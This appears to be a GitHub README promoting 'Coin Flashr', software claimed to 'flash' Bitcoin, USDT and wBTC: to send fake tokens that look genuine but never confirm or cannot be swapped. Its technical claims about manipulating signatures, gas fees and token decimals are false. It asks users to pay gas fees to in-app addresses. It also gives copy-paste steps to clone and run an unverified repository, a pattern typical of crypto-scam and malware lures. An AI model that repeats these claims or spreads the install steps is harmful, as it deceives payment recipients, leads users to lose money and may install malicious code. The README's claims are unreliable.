## Description

### What is Bitcoin Flashing?

Bitcoin flashing is a practice of sending Bitcoin from one wallet to another in a transaction that will be rendered invalid in the long run. This is achieved either by manipulating the transaction signature, gas fees, or altering the token decimals programatically.

### Bitcoin Flashing Software

Coin Flashr is an experimental software application that allows Bitcoin flashing with the complete source code included. USDT and Wrapped Bitcoin flashing are also supported. This software application exists solely as a proof-of-concept solution, and should only be used experimentally. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until you study the underlying code or attempt to swap them.

You will have a limited spendable quota of either Bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.

### Bitcoin Flashing Source Code

Bitcoin flashing source code is available for instant download as a zip file through curl on the terminal. Check the project website for more details.

## Prerequisites
This application requires [Node.js](https://nodejs.org) to run.

### Android/IOS

Click [here](https://github.com/bitcoin-flashing-public/mobile-app) to visit the mobile repository.

### Windows

Download the Node.js setup application [here](https://nodejs.org/en/download/).

### Linux

Run this code in terminal. You may need superuser privileges (sudo).

```sh
apt install nodejs
```

### MacOS

Install Homebrew (if you don't have it). Open the terminal and run:

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Once Homebrew is installed, you can install Node.js by running:

```sh
brew install node
```

## Git Installation

Before installing Coin Flashr, ensure you have Git installed on your system. Follow the instructions below for your operating system.

## Windows

### Method 1: Using Winget (Recommended)
```cmd
winget install Git.Git
```
### Method 2: Using Chocolatey
```cmd
choco install git
```

## MacOS

### Method 1: Using HOmebrew (Recommended)
```cmd
brew install git
```
### Method 2: Using Macports
```cmd
sudo port install git
```

## Linux

### Ubuntu/Debian
```cmd
sudo apt update && sudo apt install git
```

### CentOS/RHEL
```cmd
sudo yum install git
```

### Fedora
```cmd
sudo dnf install git
```

### Arch Linux
```cmd
sudo pacman -S git
```

### openSUSE
```cmd
sudo zypper install git
```

### Verification 

After installation, verify Git is installed correctly:
```cmd
git --version
```

You should see output similar to: git version 2.x.x

## Installation

1. Clone the repository:

```sh
git clone https://github.com/bitcoin-flashing-public/software && cd software
```

2. Install necessary dependencies:

```sh
npm install && npm install electron
```

## Usage

```sh
npm start
```
Gas is required for every non-bitcoin (USDT, wBTC) flashing transaction. You are responsible for your gas fees. You'll find corresponding gas addresses for each token type.


https://github.com/user-attachments/assets/76c0989e-189d-46aa-a4a3-6cb26b55de80

https://github.com/user-attachments/assets/ad5fe084-4685-4c3b-94ad-ede7c6ced6df



